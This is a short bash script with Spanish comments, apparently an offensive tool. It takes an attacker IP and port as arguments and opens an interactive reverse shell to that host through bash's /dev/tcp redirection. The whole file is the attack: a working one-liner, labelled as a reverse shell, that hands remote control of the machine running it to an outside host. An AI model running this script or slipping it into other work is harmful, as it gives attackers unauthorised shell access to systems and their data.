#!/bin/bash

# Comprobar que se pasan los dos parámetros necesarios
if [ "$#" -ne 2 ]; then
    echo -e "\n\e[1;31m[!] Error: Missing arguments.\e[0m"
    echo -e "\e[1;32mUsage:\e[0m $0 <attacker_ip> <port>"
    echo -e "\e[1;34mExample:\e[0m $0 10.0.13.7 4444\n"
    exit 1
fi

IP=$1
PORT=$2

# Ejecución de la Reverse Shell
# Usamos bash directamente para asegurar que los descriptores de archivo se redirigen bien
bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
